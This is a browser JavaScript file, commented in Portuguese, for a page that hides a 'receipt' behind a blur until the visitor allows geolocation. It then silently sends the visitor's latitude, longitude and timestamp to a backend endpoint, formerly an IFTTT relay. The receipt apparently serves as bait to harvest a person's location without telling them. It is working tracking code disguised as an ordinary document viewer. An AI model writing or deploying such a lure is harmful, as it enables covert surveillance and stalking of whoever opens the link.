// SCRIPT.JS FINAL (VERSÃO SEGURA PARA VERCEL)
// Este script é executado no navegador do usuário.

window.onload = function () {
  const receiptContainer = document.querySelector(".receipt-container");
  const permissionOverlay = document.querySelector(".permission-overlay");

  // 1. Verifica se o navegador suporta geolocalização.
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(onSuccess, onError);
  } else {
    permissionOverlay.style.display = "flex";
    permissionOverlay.innerHTML = "<p>Seu navegador não suporta Geolocalização.</p>";
  }
};

/**
 * Função executada quando o usuário permite a localização e ela é obtida com sucesso.
 */
async function onSuccess(position) {
  // Atualiza a interface para mostrar o conteúdo principal.
  document.querySelector(".receipt-container").classList.remove("content-blurred");
  document.querySelector(".permission-overlay").style.display = "none";

  // 2. Coleta os dados de latitude, longitude e o horário.
  const lat = position.coords.latitude;
  const lon = position.coords.longitude;
  const horario = encodeURIComponent(new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }));

  // 3. Define o endereço da nossa função segura na Vercel.
  const secureFunctionURL = '/api/send-location';

  try {
    // 4. Envia os dados para a NOSSA função, não mais para o IFTTT diretamente.
    // Usamos o método POST para enviar os dados no corpo da requisição.
    const response = await fetch(secureFunctionURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ lat, lon, horario }), // Converte os dados para o formato JSON.
    });

    if (!response.ok) {
      // Se a resposta da nossa função não for de sucesso, lança um erro.
      throw new Error('A chamada para a função segura falhou.');
    }

    const result = await response.json();
    console.log("Resposta da função segura:", result.message);

  } catch (error) {
    console.error("Ocorreu um erro ao enviar os dados para a função segura:", error);
    // Opcional: Mostrar uma mensagem de erro para o usuário na tela.
  }
}

/**
 * Função executada quando ocorre um erro ao obter a localização.
 */
function onError(error) {
  const permissionOverlay = document.querySelector(".permission-overlay");
  permissionOverlay.style.display = "flex";

  let message = "";
  switch (error.code) {
    case error.PERMISSION_DENIED:
      message = "Permissão de localização negada.";
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Localização indisponível.";
      break;
    case error.TIMEOUT:
      message = "Tempo esgotado para obter localização.";
      break;
    default:
      message = "Erro desconhecido na geolocalização.";
  }

  permissionOverlay.innerHTML = `<p>${message}</p>`;
  console.error("Erro de Geolocalização:", error.message);
}